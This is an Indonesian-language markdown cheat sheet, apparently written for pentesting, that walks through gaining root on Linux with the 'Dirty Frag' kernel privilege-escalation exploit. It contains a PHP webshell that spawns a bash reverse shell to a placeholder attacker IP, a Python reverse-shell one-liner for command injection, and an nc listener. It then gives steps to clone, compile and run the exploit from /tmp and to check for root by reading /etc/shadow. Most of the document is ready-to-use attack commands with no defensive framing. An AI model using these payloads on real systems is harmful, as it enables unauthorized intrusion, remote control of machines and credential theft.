# 💥 DirtyFrag — Local Privilege Escalation (CVE‑2026‑43284 / CVE‑2026‑43500)

> **Tujuan:** Mengeksploitasi celah kernel **Dirty Frag** untuk naik dari user terbatas (mis. `www-data`) ke **root**.

---

## 📌 Penjelasan Singkat

**Dirty Frag** adalah kerentanan **LPE** pada Linux kernel (versi 5.8‑5.15) yang memanfaatkan fragmentasi memori heap kernel. Dengan meng‑trigger bug ini, attacker dapat menulis nilai‑nilai arbitrer ke memori kernel dan meng‑escalasi privilege menjadi **root** tanpa memerlukan kredensial tambahan.

---

## 🛡️ Prerequisite Checks (Validasi Awal)

### 1. Identitas User Saat Ini

```bash
id
whoami
```

### 2. Versi Kernel (Harus Rentan)

```bash
uname -r
```

> ⚠️ **Catatan:** Dirty Frag berlaku untuk kernel **5.8 – 5.15.x** sebelum dipatch. Jika versi di luar rentang atau sudah dipatch, eksploit tidak akan berhasil.

### 3. Tools yang Diperlukan — `gcc`, `git`

```bash
which gcc git
```

> Jika `gcc` tidak tersedia, kompilasi exploit di mesin lokal terlebih dahulu, lalu upload binary hasil kompilasi.

---

## 🎧 Persiapan Listener (Attacker)

```bash
nc -lvnp 4444
```

---

## 📥 Akses Awal ke Target

### A️⃣ File Upload (Webshell)

Buat `shell.php`:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
```

Upload lewat aplikasi web, lalu akses:

```bash
curl http://<TARGET>/uploads/shell.php
```

### B️⃣ Command Injection (Python Reverse Shell)

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

## 📂 Working Directory (`/tmp`)

Setelah shell didapatkan, pindah ke direktori **world‑writable**:

```bash
cd /tmp
```

> `/tmp` dan `/dev/shm` umumnya world‑writable dan mengizinkan kompilasi serta eksekusi binary.

---

## 📂 Exploit Dirty Frag

### 1. Clone Repository

```bash
git clone https://github.com/V4bel/dirtyfrag.git
cd dirtyfrag
```

### 2. Compile Exploit

```bash
gcc -O0 -Wall -o exp exp.c -lutil
```

### 3. Run Exploit

```bash
./exp
```

Jika berhasil, proses akan memunculkan **root shell**.

---

## ✅ Verifikasi Hak Root

```bash
id
whoami
head -n 1 /etc/shadow   # hanya dapat dibaca oleh root
```

Output yang diharapkan:

```text
uid=0(root) gid=0(root) groups=0(root)
root
root:$6$...:...
```

---

## 🪜 Alur Eksploitasi

```text
Validasi kernel (uname -r)
      ↓
Pastikan versi rentan (5.8 – 5.15.x)
      ↓
Akses awal (webshell / command injection)
      ↓
Pindah ke /tmp
      ↓
git clone && gcc && ./exp
      ↓
Verifikasi root (id)
```

---

## 📋 Checklist Dirty Frag

- [ ] Pastikan kernel target rentan (5.8‑5.15).
- [ ] Cek `gcc`/`git` atau compile lokal lalu upload binary.
- [ ] Siapkan listener (`nc -lvnp 4444`).
- [ ] Dapatkan akses awal (webshell atau command injection).
- [ ] Pindah ke `/tmp` (atau `/dev/shm`).
- [ ] Clone, compile, dan jalankan exploit.
- [ ] Verifikasi `uid=0(root)`.

---

## 📚 Referensi

- [Dirty Frag – CVE‑2026‑43284 / CVE‑2026‑43500](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-43284)
- [GitHub – dirtyfrag exploit](https://github.com/V4bel/dirtyfrag)
- [OWASP – Local Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
